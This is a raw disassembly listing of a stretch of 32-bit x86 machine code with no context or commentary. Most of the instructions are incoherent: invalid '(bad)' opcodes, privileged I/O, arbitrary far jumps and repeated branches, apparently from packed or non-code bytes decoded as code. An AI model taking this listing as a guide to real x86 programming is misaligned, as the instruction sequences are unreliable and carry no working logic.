  413a5e:	lea    ecx,[ebp+0x2c00008d]
  413a64:	jge    0x413ae1
  413a66:	nop
  413a67:	add    BYTE PTR [eax],al
  413a69:	arpl   WORD PTR ds:0x5c85ddf4,sp
  413a6f:	mov    ss,WORD PTR [edx+0x7e]
  413a72:	je     0x413aee
  413a74:	pusha  
  413a75:	frstor [ebx-0x60665a90]
  413a7b:	std    
  413a7c:	xor    DWORD PTR [ebx+0x10161386],ebx
  413a82:	cli    
  413a83:	out    0xd7,eax
  413a85:	xchg   ecx,eax
  413a86:	cmp    al,0x9e
  413a88:	call   0x6100:0x928a44
  413a8f:	or     eax,DWORD PTR [eax]
  413a91:	add    BYTE PTR [eax+0x73],dl
  413a94:	sbb    eax,0xf94c0000
  413a99:	test   eax,0x753800ad
  413a9e:	pop    edi
  413a9f:	dec    ecx
  413aa0:	rcl    dh,cl
  413aa2:	or     al,0x35
  413aa4:	and    BYTE PTR [edi-0x7fcade9a],0x70
  413aab:	cmp    cl,ch
  413aad:	gs jmp 0x413ab0
  413ab0:	add    BYTE PTR [eax],al
  413ab2:	das    
  413ab3:	adc    BYTE PTR [ebp-0x2d],ah
  413ab6:	jle    0x413aea
  413ab8:	pop    ecx
  413ab9:	push   ebx
  413aba:	jmp    0xdd1a2233
  413abf:	jmp    0xecbc:0x2f12c578
  413ac6:	pop    es
  413ac7:	pop    ebp
  413ac8:	mul    BYTE PTR [edi]
  413aca:	cwde   
  413acb:	mov    edi,0x2ecf99
  413ad0:	add    bh,al
  413ad2:	out    dx,al
  413ad3:	adc    BYTE PTR [eax],al
  413ad5:	add    BYTE PTR [eax],al
  413ad7:	jne    0x413b4e
  413ad9:	jne    0x413b50
  413adb:	jne    0x413b52
  413add:	jne    0x413b54
  413adf:	jne    0x413adf
  413ae1:	mov    esi,0xd9
	...
  413aee:	rcl    DWORD PTR [ebp+edi*1-0x2b44e34b],0x93
  413af6:	ficomp WORD PTR [ebp+0x12]
  413af9:	popf   
  413afa:	or     eax,0x12ba5241
  413aff:	add    esp,DWORD PTR [ebx]
  413b01:	retf   0x5b96
  413b04:	dec    edi
  413b05:	in     eax,0x0
  413b07:	add    bh,ah
  413b09:	and    eax,DWORD PTR [eax]
  413b0b:	add    ch,dl
  413b0d:	add    BYTE PTR ss:[eax],al
  413b10:	push   esi
  413b11:	mov    ebp,esp
  413b13:	pop    edi
  413b14:	push   ds
  413b15:	lds    eax,FWORD PTR ds:0xac5dab89
  413b1b:	fnstcw WORD PTR ds:0x48ab1f6a
  413b21:	pop    edi
  413b22:	xchg   BYTE PTR [esi],dl
  413b24:	push   ebx
  413b25:	xor    ebp,DWORD PTR [esi-0x50]
  413b28:	add    BYTE PTR [ebx+ebp*4],al
  413b2b:	leave  
  413b2c:	mov    ch,al
  413b2e:	add    al,0x4
  413b30:	add    al,0x8e
  413b32:	adc    al,0x87
  413b34:	jge    0x413b2c
  413b36:	pop    edi
  413b37:	ret    0xaee2
  413b3a:	in     al,dx
  413b3b:	psubd  mm1,QWORD PTR [edi+0x2f5db54]
  413b42:	jl     0x413b99
  413b44:	mov    BYTE PTR [esi-0x5a0119ce],0x1b
  413b4b:	int3   
  413b4c:	dec    edx
  413b4d:	rol    ah,cl
  413b4f:	(bad)  
  413b50:	sahf   
  413b51:	into   
  413b52:	push   ds
  413b53:	ins    BYTE PTR es:[edi],dx
  413b54:	add    al,0x4
  413b56:	clc    
  413b57:	adc    al,BYTE PTR [esp+eax*1]
  413b5a:	add    al,0x8b
  413b5c:	mov    ecx,DWORD PTR [ebx-0x74747475]
  413b62:	mov    ecx,DWORD PTR [ebx+0x5b770c]
	...
  413b70:	add    BYTE PTR [eax],al
  413b72:	or     BYTE PTR [edx],0x6a
  413b75:	fldenv [edi-0x44]
  413b78:	gs push eax
  413b7a:	(bad)  [edx]
  413b7c:	adc    al,0x2b
  413b7e:	(bad)  
  413b7f:	sub    ebp,eax
  413b81:	cmp    eax,0xdbfc834f
  413b86:	push   es
  413b87:	push   0x75
  413b89:	lock add BYTE PTR [eax],al
  413b8c:	xor    eax,edi
  413b8e:	jb     0x413b6f
  413b90:	cld    
  413b91:	pop    es
  413b92:	cmc    
  413b93:	in     eax,0x48
  413b95:	iret   
  413b96:	div    ebp
  413b98:	repz ret 
  413b9a:	cmp    ch,BYTE PTR [edi-0x65]
  413b9d:	into   
  413b9e:	xchg   ecx,eax
  413b9f:	and    BYTE PTR [esi+0x6],dh
  413ba2:	ret    
  413ba3:	push   ds
  413ba4:	sub    DWORD PTR [edi],0x65
  413ba7:	push   es
  413ba8:	cmp    al,BYTE PTR [eax]
  413baa:	add    BYTE PTR [esi],bl
  413bac:	not    BYTE PTR [edx]
  413bae:	add    BYTE PTR [eax],al
  413bb0:	xor    bh,cl
  413bb2:	and    BYTE PTR [eax],al
  413bb4:	mov    edi,DWORD PTR [ecx+0x1aa06cbf]
  413bba:	repz test DWORD PTR [ecx+0x2b],ebp
  413bbe:	mov    cl,0x3f
  413bc0:	lods   al,BYTE PTR ds:[esi]
  413bc1:	add    dl,BYTE PTR [ecx+0x79b65a50]
  413bc7:	push   edx
  413bc8:	mov    edi,0x3198c528
  413bcd:	mov    ecx,DWORD PTR [ebx-0x74140c75]
  413bd3:	mov    ebp,ecx
  413bd5:	aas    
  413bd6:	mov    ecx,DWORD PTR [ebx-0x17171775]
  413bdc:	call   0xe92a24c9
  413be1:	call   0x818236e4
  413be6:	mov    WORD PTR [ebp+0x724288f1],ss
  413bec:	pop    ds
  413bed:	pop    ds
  413bee:	xchg   esi,eax
  413bef:	push   0x3e8eeebd
  413bf4:	jg     0x413c1a
  413bf6:	sbb    DWORD PTR [eax+0x5],esi
  413bf9:	mov    ch,0xff
  413bfb:	(bad)  
  413bfc:	(bad)  
  413bfd:	(bad)  
  413bfe:	(bad)  
  413bff:	(bad)  
  413c00:	(bad)  
  413c01:	(bad)  
  413c02:	(bad)  
  413c03:	call   0x1aa418f0
  413c08:	leave  
  413c09:	call   0x384ea7f6
  413c0e:	jbe    0x413c77
  413c10:	stos   BYTE PTR es:[edi],al
  413c11:	daa    
  413c12:	mov    cs,WORD PTR [edi-0x7bd51063]
  413c18:	jp     0x413bfb
  413c1a:	and    eax,0x296950c3
  413c1f:	in     eax,dx
  413c20:	or     bh,BYTE PTR [ebp-0x7a]
  413c23:	icebp  
  413c24:	and    ecx,DWORD PTR [edi+0x696ae068]
  413c2a:	add    dh,BYTE PTR [ebp-0x171764ae]
  413c30:	mov    ebx,0x90e8e8d2
  413c35:	dec    edi
  413c36:	xor    al,0xe8
  413c38:	add    al,dl
  413c3a:	xchg   esp,edi
  413c3c:	cmp    dh,BYTE PTR [eax]
  413c3e:	jae    0x413bf9
  413c40:	jo     0x413c83
  413c42:	ds jb  0x413c98
  413c45:	bound  edi,QWORD PTR [ecx+0x6f]
  413c48:	jbe    0x413cba
  413c4a:	arpl   WORD PTR cs:[ebx+esi*2+0x65],si
  413c4f:	arpl   WORD PTR [ebx+0x72],si
  413c52:	jb     0x413cc6
  413c54:	push   eax
  413c55:	cs ins DWORD PTR es:[edi],dx
  413c57:	cs gs jbe 0x413ccd
  413c5b:	or     ch,BYTE PTR gs:[esi+0x74]
  413c5f:	cmp    ch,BYTE PTR [ebp+0x63]
  413c62:	outs   dx,DWORD PTR ds:[esi]
  413c63:	and    BYTE PTR [ecx+0x6e],ah
  413c66:	inc    esp
  413c67:	outs   dx,DWORD PTR ds:[esi]
  413c68:	push   ebx
  413c69:	jae    0x413cd3
  413c6b:	jbe    0x413c8d
  413c6d:	ins    DWORD PTR es:[edi],dx
  413c6e:	gs gs jo 0x413ca0
  413c72:	jne    0x413cd8
  413c74:	je     0x413cc8
  413c76:	or     ch,BYTE PTR [ecx+0x70]
  413c79:	jb     0x413ce0
  413c7b:	push   edi
  413c7c:	or     ch,BYTE PTR [esi+0x74]
  413c7f:	and    BYTE PTR gs:[ebx+0x2e],dh
  413c83:	and    BYTE PTR [eax+0x6d],dh
  413c86:	bound  edi,QWORD PTR [esi+ebp*1]
  413c89:	and    ch,BYTE PTR [ecx+0x65]
  413c8c:	jo     0x413d01
  413c8e:	gs or  eax,0x2e622065
  413c94:	outs   dx,BYTE PTR ds:[esi]
  413c95:	imul   esp,DWORD PTR gs:[eax],0x73222053
  413c9c:	and    BYTE PTR [esi+ebp*2],bh
  413c9f:	dec    ebp
  413ca0:	jae    0x413d0f
  413ca2:	gs gs popa 
  413ca5:	push   ss
  413ca6:	cmp    BYTE PTR [edi+0x6848f3c0],0x72
  413cad:	es xchg ecx,eax
  413caf:	inc    esp
  413cb0:	bound  esp,QWORD PTR [edi+esi*1-0x4b]
  413cb4:	xor    esp,DWORD PTR [ebx+0x24000000]
  413cba:	iret   
  413cbb:	cmp    DWORD PTR [eax+0x64],edi
  413cbe:	cmp    DWORD PTR [ebx-0x1bef53ac],eax
  413cc4:	or     eax,ecx
  413cc6:	test   al,0xa
  413cc8:	mov    edx,0xcd258627
  413ccd:	cdq    
  413cce:	lds    edx,FWORD PTR [ebp+0x34]
  413cd1:	cmp    edx,eax
  413cd3:	push   edx
  413cd4:	popf   
  413cd5:	out    0x0,eax
  413cd7:	add    BYTE PTR [ecx+0xd938],dh
	...
  413ce5:	add    BYTE PTR [eax],al
  413ce7:	retf   0xae91
	...
  413cf2:	add    BYTE PTR [eax],al
  413cf4:	add    BYTE PTR ds:0xbd14e222,al
  413cfa:	adc    ecx,DWORD PTR [esi-0x1df5f964]
  413d00:	add    ebx,DWORD PTR [edx+ecx*8]
  413d03:	das    
  413d04:	les    eax,FWORD PTR [ebx]
  413d06:	cmp    eax,0x7d40781b
  413d0b:	push   ss
  413d0c:	je     0x413d0e
  413d0e:	add    bl,cl
  413d10:	mov    bh,0x0
  413d12:	add    BYTE PTR [edx],ah
  413d14:	pop    ebx
  413d15:	add    BYTE PTR [eax],al
  413d17:	mov    ecx,0x9aab8522
  413d1c:	inc    esi
  413d1d:	mov    edx,0x7029074f
  413d22:	nop
  413d23:	sti    
  413d24:	push   edi
  413d25:	pop    ds
  413d26:	inc    dh
  413d28:	mov    cl,ch
  413d2a:	sub    eax,0xf411780e
  413d2f:	add    BYTE PTR [eax],al
  413d31:	xlat   BYTE PTR ds:[ebx]
  413d32:	fidivr DWORD PTR [ecx]
  413d34:	dec    ebx
  413d35:	add    BYTE PTR [eax],al
  413d37:	add    BYTE PTR [eax-0x4e],bh
  413d3a:	push   edi
  413d3b:	add    DWORD PTR [edi],edi
  413d3d:	or     BYTE PTR [edx+0x4f],0x1b
  413d41:	fdivr  st(2),st
  413d43:	or     esi,DWORD PTR [ecx]
  413d45:	popf   
  413d46:	mov    ch,0xcc
  413d48:	sbb    BYTE PTR [ebx],al
  413d4a:	inc    ecx
  413d4b:	pop    ebp
  413d4c:	xchg   DWORD PTR [esi+0xa809b08],edx
  413d52:	ficom  WORD PTR [edi+0x4351b31a]
  413d58:	out    0x70,al
  413d5a:	daa    
  413d5b:	add    BYTE PTR [eax],al
  413d5d:	sahf   
  413d5e:	scas   al,BYTE PTR es:[edi]
	...
  413d6b:	mov    ds:0xe8e84908,eax
  413d70:	call   0xe92a265d
  413d75:	call   0x782a2662
  413d7a:	mov    edx,0x4d662192
  413d7f:	cdq    
  413d80:	stos   BYTE PTR es:[edi],al
  413d81:	call   0xe54c580a
  413d86:	and    eax,0xd9d0b73f
  413d8b:	imul   ecx,DWORD PTR [ebx+0x54],0xffffffa1
  413d8f:	mov    DWORD PTR [esi-0x5c711718],eax
  413d95:	xchg   ebp,eax
  413d96:	loope  0x413dab
  413d98:	xor    edx,ecx
  413d9a:	and    al,0xef
  413d9c:	mov    bh,0xf4
  413d9e:	es pop ds
  413da0:	or     BYTE PTR [eax+eax*4+0x5c],0xee
  413da5:	pusha  
  413da6:	into   
  413da7:	xchg   esp,eax
  413da8:	ret    0x3f63
  413dab:	cmp    DWORD PTR [ecx],edx
  413dad:	aad    0x77
  413daf:	arpl   ax,bp
  413db1:	call   0xe8e33e81
  413db6:	call   0xe849522b
  413dbb:	call   0xe977f5e7
  413dc0:	jae    0x413dee
  413dc2:	out    dx,eax
  413dc3:	dec    esi
  413dc4:	pop    es
  413dc5:	mov    ah,0x14
  413dc7:	pop    edi
  413dc8:	dec    esp
  413dc9:	pop    ss
  413dca:	xor    dh,0x5d
  413dcd:	pushf  
  413dce:	fmul   st,st(3)
  413dd0:	out    0x79,al
  413dd2:	inc    ebp
  413dd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413dd4:	call   0x3a0c26c1
  413dd9:	call   0xe9236fc6
  413dde:	call   0x413dcb
  413de3:	(bad)  
  413de4:	(bad)  
  413de5:	(bad)  
  413de6:	(bad)  
  413de7:	(bad)  
  413de8:	call   FWORD PTR [ebx+eiz*4+0x4cb1484b]
  413def:	sub    al,0x42
  413df1:	repz pop esi
  413df3:	pop    eax
  413df4:	into   
  413df5:	cdq    
  413df6:	fdivr  DWORD PTR [edx-0x24]
  413df9:	add    DWORD PTR [esi],esp
  413dfb:	mov    ds:0xe8512fdc,eax
  413e00:	out    dx,al
	...
  413e09:	add    BYTE PTR [ebx+0x4eb2ad8b],cl
  413e0f:	sub    ecx,DWORD PTR [ebx+0x1cad4f8b]
  413e15:	loop   0x413e85
  413e17:	mov    edi,DWORD PTR [esi]
  413e19:	add    al,ch
  413e1b:	out    0x4e,eax
  413e1d:	or     eax,0xffffffe6
  413e20:	add    bh,BYTE PTR [eax+0x49]
  413e23:	or     BYTE PTR [ebx+ecx*2+0x2eddfdf3],al
  413e2a:	mov    cl,0x8a
  413e2c:	fcos   
  413e2e:	mov    ah,0xc3
  413e30:	pushf  
  413e31:	pop    ss
  413e32:	daa    
  413e33:	jno    0x413dba
  413e35:	mov    ecx,DWORD PTR [ebx-0x74743321]
  413e3b:	cmp    eax,0x508b033d
  413e40:	pop    ecx
  413e41:	rol    DWORD PTR cs:[edx],0xeb
  413e45:	test   DWORD PTR [edx+0x4975d501],esp
  413e4b:	stos   BYTE PTR es:[edi],al
  413e4c:	inc    esi
  413e4d:	and    eax,0x4b3d2a71
  413e52:	int3   
  413e53:	mov    esp,0xf859030c
  413e58:	push   eax
  413e59:	push   eax
  413e5a:	push   eax
  413e5b:	js     0x413e4a
  413e5d:	(bad)  
  413e5e:	cmc    
  413e5f:	clc    
  413e60:	xchg   BYTE PTR [esi+0x1],dl
  413e63:	inc    ebp
  413e64:	dec    esi
  413e65:	popf   
  413e66:	xchg   DWORD PTR [eax+0x417c04bb],ebx
  413e6c:	imul   BYTE PTR [edx-0x6c]
  413e6f:	shr    DWORD PTR [ebx],cl
  413e71:	pop    edx
  413e72:	pop    ss
  413e73:	and    eax,0xe838fdac
  413e78:	push   eax
  413e79:	push   eax
  413e7a:	fwait
  413e7b:	cmp    al,0xfd
  413e7d:	push   eax
  413e7e:	push   eax
  413e7f:	push   eax
  413e80:	mov    DWORD PTR [ecx-0x76767677],ecx
  413e86:	mov    DWORD PTR [ecx-0x2aebed77],ecx
  413e8c:	je     0x413f02
  413e8e:	je     0x413f04
  413e90:	je     0x413f06
  413e92:	je     0x413f08
  413e94:	je     0x413e19
  413e96:	adc    esp,0xffffffbe
  413e99:	pop    ebx
  413e9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e9b:	push   es
  413e9c:	cmp    dl,ah
  413e9e:	mov    ebx,0xd303f9cf
  413ea3:	sub    al,BYTE PTR [edx-0x31]
  413ea6:	push   ebx
  413ea7:	sar    ebp,0xc1
  413eaa:	(bad)  
  413eab:	mov    bh,BYTE PTR [esi]
  413ead:	xchg   ebx,eax
  413eae:	ret    0x8383
  413eb1:	cld    
  413eb2:	mov    ds:0x255c8383,eax
  413eb7:	add    DWORD PTR [ebx+0xbf9f473],0x35
  413ebe:	mov    esp,0xf3b0ef52
  413ec3:	arpl   WORD PTR [ecx+0x3d],si
  413ec6:	cmp    al,0x70
  413ec8:	pop    eax
  413ec9:	ins    BYTE PTR es:[edi],dx
  413eca:	fisttp DWORD PTR [ecx-0x6f]
  413ecd:	jmp    0x1bff:0x832d7274
  413ed4:	mov    al,0xe6
  413ed6:	(bad)  
  413ed7:	(bad)  
  413ed8:	(bad)  
  413ed9:	call   FWORD PTR [eax]
  413edb:	clc    
  413edc:	jnp    0x413f4d
  413ede:	xchg   DWORD PTR [ebx+0x77],ebp
  413ee1:	mov    esp,0xd15b12c3
  413ee6:	dec    edi
  413ee7:	scas   eax,DWORD PTR es:[edi]
  413ee8:	icebp  
  413ee9:	inc    eax
  413eea:	push   edi
  413eeb:	ins    DWORD PTR es:[edi],dx
  413eec:	ins    BYTE PTR es:[edi],dx
  413eed:	sub    al,0x7e
  413eef:	dec    eax
  413ef0:	nop
  413ef1:	in     eax,0x8e
  413ef3:	(bad)  [esi]
  413ef5:	enter  0x1939,0x1
  413ef9:	arpl   bx,sp
  413efb:	add    eax,0x5ffff7d
  413f00:	sbb    edi,edi
  413f02:	(bad)  
  413f03:	dec    DWORD PTR [ebp-0x72727273]
  413f09:	lea    ecx,[ebp-0x504e7273]
  413f0f:	sar    bh,cl
  413f11:	(bad)  
  413f12:	(bad)  
  413f13:	(bad)  
  413f14:	(bad)  
  413f15:	(bad)  
  413f16:	(bad)  
  413f17:	(bad)  
  413f18:	inc    DWORD PTR [esp+eax*1]
  413f1b:	add    dh,BYTE PTR [ebx]
  413f1d:	out    dx,eax
  413f1e:	sbb    BYTE PTR [edi-0xd],ch
  413f21:	or     BYTE PTR [ebp+0x22],dh
  413f24:	stos   DWORD PTR es:[edi],eax
  413f25:	je     0x413ee7
  413f27:	sub    ch,BYTE PTR [eax]
  413f29:	pusha  
  413f2a:	lods   al,BYTE PTR ds:[esi]
  413f2b:	ror    ecx,cl
  413f2d:	jne    0x413fa0
  413f2f:	out    0x18,eax
  413f31:	mov    ebp,0xdc04043f
  413f36:	leave  
  413f37:	mov    al,ds:0x385c5e87
  413f3c:	pop    ss
  413f3d:	mov    esp,0xa80f963f
  413f42:	stos   BYTE PTR es:[edi],al
  413f43:	pop    esp
  413f44:	dec    edi
  413f45:	test   DWORD PTR [ecx-0x60],ecx
  413f48:	push   esi
  413f49:	outs   dx,BYTE PTR ds:[esi]
  413f4a:	aam    0x4b
  413f4c:	es mov dh,0x78
  413f4f:	dec    ecx
  413f50:	dec    ecx
  413f51:	or     BYTE PTR [esp+eax*1],al
  413f54:	jmp    0x264b:0x404a9c8
  413f5b:	rol    BYTE PTR [eax+eax*1],0xa0
  413f5f:	cmc    
  413f60:	mov    ch,0xab
  413f62:	repz retf 0x3f0c
  413f66:	leave  
  413f67:	xchg   edx,eax
  413f68:	xchg   DWORD PTR [edx],ebx
  413f6a:	cmp    DWORD PTR [eax],edi
  413f6c:	inc    esp
  413f6d:	mov    edx,0x5aef3662
  413f72:	sbb    eax,0xe1a312
  413f77:	add    BYTE PTR [eax],al
  413f79:	daa    
  413f7a:	xchg   edx,eax
  413f7b:	add    BYTE PTR [eax],al
  413f7d:	and    DWORD PTR [esi],ecx
  413f7f:	add    BYTE PTR [eax],al
  413f81:	add    BYTE PTR [ebx-0x74747475],cl
  413f87:	mov    ecx,DWORD PTR [ebx-0x2b5e7475]
  413f8d:	jbe    0x413ffd
  413f8f:	arpl   WORD PTR [eax+0x79],dx
  413f92:	cmp    al,0x20
  413f94:	outs   dx,BYTE PTR gs:[esi]
  413f96:	and    BYTE PTR [edx],ah
  413f98:	gs outs dx,DWORD PTR fs:[esi]
  413f9b:	and    BYTE PTR [ebp+eiz*2+0x65],dh
  413f9f:	outs   dx,DWORD PTR ds:[esi]
  413fa0:	and    BYTE PTR [ebx+0x68],dh
  413fa3:	push   ebx
  413fa4:	jo     0x414018
  413fa6:	ins    DWORD PTR es:[edi],dx
  413fa7:	jb     0x41401a
  413fa9:	jae    0x41401b
  413fab:	and    BYTE PTR gs:[ebp+0x68],ah
  413faf:	popa   
  413fb0:	ins    DWORD PTR es:[edi],dx
  413fb1:	jbe    0x414020
  413fb3:	outs   dx,BYTE PTR ds:[esi]
  413fb4:	imul   esi,DWORD PTR [edx+0x72],0x774d733d
  413fbb:	das    
  413fbc:	jno    0x413fec
  413fbe:	cs push ebx
  413fc0:	and    BYTE PTR gs:0x7373612f,cl
  413fc7:	gs ins DWORD PTR es:[edi],dx
  413fc9:	dec    eax
  413fca:	push   edi
  413fcb:	mov    esp,0x265fb7aa
  413fd0:	mov    edi,0xa42f2efd
  413fd5:	xor    BYTE PTR [ebp-0x4d],ah
  413fd8:	in     eax,0xf8
  413fda:	test   DWORD PTR [ebp-0x53ac7173],edx
  413fe0:	mov    BYTE PTR [eax],al
	...
  413fea:	je     0x414060
  413fec:	scas   eax,DWORD PTR es:[edi]
  413fed:	pop    ebx
  413fee:	mov    ebx,DWORD PTR [edi+0x74]
  413ff1:	je     0x413fbd
  413ff3:	out    0xcc,al
  413ff5:	popa   
  413ff6:	inc    edx
  413ff7:	rol    BYTE PTR [ebx+0x4d],1
  413ffa:	pop    edi
  413ffb:	aaa    
  413ffc:	or     ecx,esp
  413ffe:	sbb    al,0x59
  414000:	jns    0x41400f
  414002:	xchg   edi,eax
  414003:	pop    ebx
  414004:	shl    DWORD PTR [ecx],0xf2
  414007:	jg     0x413fbd
  414009:	mov    ecx,ecx
  41400b:	xor    eax,0xd06b96f1
  414010:	pop    esp
  414011:	cmp    eax,0x74bd4d9c
  414016:	je     0x414036
  414018:	jl     0x41408e
  41401a:	je     0x414078
  41401c:	sbb    edx,DWORD PTR [edi-0x54257c8c]
  414022:	jb     0x41409a
  414024:	pop    esi
  414025:	rol    DWORD PTR [edi-0x60],1
  414028:	cdq    
  414029:	cld    
  41402a:	mov    bl,0x49
  41402c:	sbb    BYTE PTR [ebx+0x547b51f7],dl
  414032:	cmp    al,0x1b
  414034:	int    0x52
  414036:	inc    esp
  414037:	and    eax,DWORD PTR [ebx-0x21287c7d]
  41403d:	or     eax,0xbf07059b
  414042:	stos   BYTE PTR es:[edi],al
  414043:	stc    
  414044:	mov    eax,ds:0xeabfefc2
  414049:	push   ebx
  41404a:	into   
  41404b:	xchg   esp,eax
  41404c:	sub    eax,0xc3a9a3e8
  414051:	pusha  
  414052:	lahf   
  414053:	ror    BYTE PTR [edi-0x36],cl
  414056:	shr    DWORD PTR [edx-0x3f117c7d],cl
  41405c:	in     eax,dx
  41405d:	add    DWORD PTR [ebx+0x83],0x0
  414064:	add    BYTE PTR [eax],al
  414066:	add    BYTE PTR [eax],al
  414068:	add    BYTE PTR [esi-0x8],cl
  41406b:	ja     0x4140e2
  41406d:	jne    0x4140e4
  41406f:	jne    0x4140e6
  414071:	jne    0x4140e8
  414073:	jne    0x4140ea
  414075:	add    BYTE PTR [eax],al
  414077:	pop    ebx
  414078:	popf   
  414079:	pop    ebp
  41407a:	jp     0x414024
  41407c:	data16 rol BYTE PTR [ecx+0x655d901c],1
  414083:	sbb    bl,BYTE PTR gs:[ecx+ecx*1]
  414087:	and    DWORD PTR [ecx],ebx
  414089:	jge    0x41406d
  41408b:	and    eax,0xcc6fea
  414090:	add    al,bl
  414092:	out    dx,eax
  414093:	add    BYTE PTR [eax],al
  414095:	push   0x73
  414097:	add    BYTE PTR [eax],al
  414099:	mov    BYTE PTR [ebx],bh
  41409b:	xor    ah,ch
  41409d:	cli    
  41409e:	mov    esi,0xed505f65
  4140a3:	mov    bl,0xca
  4140a5:	pop    esi
  4140a6:	dec    DWORD PTR [edx]
  4140a8:	inc    edx
  4140a9:	ins    DWORD PTR es:[edi],dx
  4140aa:	test   eax,0x58ffec3b
  4140af:	xor    al,0x4b
  4140b1:	add    BYTE PTR [ebx-0x4201f069],cl
  4140b7:	mov    ecx,DWORD PTR [ebx-0x58668b75]
  4140bd:	jne    0x4140dc
  4140bf:	imul   edx,DWORD PTR [edx-0x102d92c],0x42
  4140c6:	push   cs
  4140c7:	adc    DWORD PTR [ecx+eiz*8-0x5809f27a],ebp
  4140ce:	in     al,0xc
  4140d0:	inc    ecx
  4140d1:	sub    edi,eax
  4140d3:	push   es
  4140d4:	lea    edi,[esi-0x6fd0b90]
  4140da:	push   cs
  4140db:	sar    DWORD PTR [ebx+ecx*4-0x75],0xb7
  4140e0:	jbe    0x41406d
  4140e2:	mov    ecx,DWORD PTR [ebx-0x74747475]
  4140e8:	mov    ecx,DWORD PTR [ebx-0x4d747475]
  4140ee:	xor    dl,BYTE PTR [eax+0xc0c0c0c]
  4140f4:	or     al,0xc
  4140f6:	or     al,0xc
  4140f8:	or     al,0xff
  4140fa:	dec    ecx
  4140fc:	bswap  edi
  4140fe:	xchg   ebx,eax
  4140ff:	xchg   ebx,eax
  414100:	mov    dl,0xe2
  414102:	inc    edi
  414103:	pusha  
  414104:	loopne 0x414179
  414106:	out    0xc2,eax
  414108:	jecxz  0x41416a
  41410a:	retf   
  41410b:	jo     0x4140ce
  41410d:	jnp    0x41412f
  41410f:	cs and bh,al
  414112:	xor    bh,bh
  414114:	dec    DWORD PTR [eax+0x47]
  414117:	pop    ebx
  414118:	shl    DWORD PTR [ecx+edi*8-0x10764e3d],cl
  41411f:	sub    al,0x79
  414121:	or     ecx,DWORD PTR ds:0x2a747939
  414127:	xchg   esi,eax
  414128:	shl    ebx,0x6
  41412b:	push   edx
  41412c:	xor    edi,DWORD PTR [eax]
  41412e:	push   0x66
  414130:	jmp    0x1866:0xbaffff8d
  414137:	(bad)  
  414138:	call   DWORD PTR [edi+ebx*2]
  41413b:	push   ebp
  41413c:	(bad)  
  41413d:	(bad)  
  41413e:	fmul   st(6),st
  414140:	add    BYTE PTR [edx+0x43],bh
  414143:	push   edx
  414144:	mov    eax,0x574aa2b2
  414149:	aaa    
  41414a:	fidivr DWORD PTR [eax]
  41414c:	fcomip st,st(5)
  41414e:	sub    al,0xd3
  414150:	pop    edi
  414151:	mov    eax,ds:0x7b11575f
  414156:	(bad)  
  414157:	(bad)  
  414158:	(bad)  
  414159:	(bad)  
  41415a:	cmp    edi,edi
  41415c:	(bad)  
  41415d:	ds fcos 
  414160:	(bad)  
  414161:	dec    DWORD PTR [ebx-0x74747475]
  414167:	mov    ecx,DWORD PTR [ebx-0x4a377475]
  41416d:	sahf   
  41416e:	jmp    FWORD PTR [ecx-0x57f1f62]
  414174:	int    0x1f
  414176:	cdq    
  414177:	(bad)  
  414179:	dec    edi
  41417a:	cdq    
  41417b:	(bad)  
  41417c:	stc    
  41417d:	aam    0x9c
  41417f:	sub    sp,WORD PTR ds:[ebp-0x33333334]
  414187:	int3   
  414188:	int3   
  414189:	int3   
  41418a:	int3   
  41418b:	int3   
  41418c:	call   0x4161b879
  414191:	jae    0x414207
  414193:	fs jb  0x4141fb
  414196:	or     bh,BYTE PTR [eax+eiz*1]
  414199:	imul   esp,DWORD PTR [ebp+0x3e],0x636f2e6d
  4141a0:	gs gs inc esp
  4141a3:	gs popa 
  4141a5:	dec    ebp
  4141a6:	jb     0x4141b5
  4141a8:	and    BYTE PTR [ebp+0x65],cl
  4141ab:	js     0x41420e
  4141ad:	outs   dx,DWORD PTR ds:[esi]
  4141ae:	and    BYTE PTR gs:[edx],ah
  4141b1:	imul   ebp,DWORD PTR [esi+0x20],0x7069206e
  4141b8:	gs ins WORD PTR es:[edi],dx
  4141bb:	outs   dx,DWORD PTR ds:[esi]
  4141bc:	and    BYTE PTR [eax],ah
  4141be:	inc    esp
  4141bf:	and    BYTE PTR [ebp+0x53],ah
  4141c2:	popa   
  4141c3:	push   edx
  4141c4:	and    BYTE PTR gs:[eax+0xd],bh
  4141c8:	ins    DWORD PTR es:[edi],dx
  4141c9:	or     ah,BYTE PTR [eax]
  4141cb:	jb     0x41423a
  4141cd:	and    dh,BYTE PTR [edx+0x6d]
  4141d0:	and    ch,BYTE PTR [esi+0x6e]
  4141d3:	data16 jb 0x4141f6
  4141d6:	sub    al,0x20
  4141d8:	and    BYTE PTR ds:0x4b207254,cl
  4141de:	addr16 jns 0x414246
  4141e1:	imul   ebp,DWORD PTR [ecx+0x6f],0x7265720a
  4141e8:	imul   esp,DWORD PTR [ebp+0x74],0xba9d7cd5
  4141ef:	call   0x8ec05adc
  4141f4:	sti    
  4141f5:	stc    
  4141f6:	xor    ah,dh
  4141f8:	xor    esi,DWORD PTR [ecx+eax*4-0x11]
  4141fc:	xchg   BYTE PTR [ecx*1+0x763260ac],bh
  414203:	inc    esi
  414204:	sbb    dl,ch
  414206:	add    cl,0x42
  414209:	fnstsw WORD PTR [edx]
  41420b:	xchg   esi,eax
  41420c:	mov    esp,0xab0ccb80
  414211:	mov    ebp,0xe8e8c841
  414216:	mov    al,0x22
  414218:	call   0x48578605
  41421d:	call   0xb4720522
  414222:	push   ebx
  414223:	in     eax,dx
  414224:	mov    dh,0xd
  414226:	imul   ebp,DWORD PTR [eax],0x1c8ebfba
  41422c:	lahf   
  41422d:	push   ebp
  41422e:	cmc    
  41422f:	fldcw  WORD PTR [edi+eax*2]
  414232:	xchg   ebx,eax
  414233:	jmp    0x0:0x1ce42e
  41423a:	pop    ss
  41423b:	xor    eax,DWORD PTR [ebp+0x13]
  41423e:	dec    ebp
  41423f:	daa    
  414240:	call   0xf7b49203
  414245:	mov    cl,0x5e
  414247:	ins    DWORD PTR es:[edi],dx
  414248:	stc    
  414249:	stos   DWORD PTR es:[edi],eax
  41424a:	stos   DWORD PTR es:[edi],eax
  41424b:	pusha  
  41424c:	rcl    esp,1
  41424e:	(bad)  
  41424f:	jmp    0x6632:0xec1171b4
  414256:	ins    BYTE PTR es:[edi],dx
  414257:	add    BYTE PTR [eax],al
  414259:	xchg   esp,eax
  41425a:	cvtps2pd xmm0,QWORD PTR [eax]
  41425d:	add    BYTE PTR [eax],al
  41425f:	jne    0x4142d6
  414261:	jne    0x4142d8
  414263:	jne    0x4142da
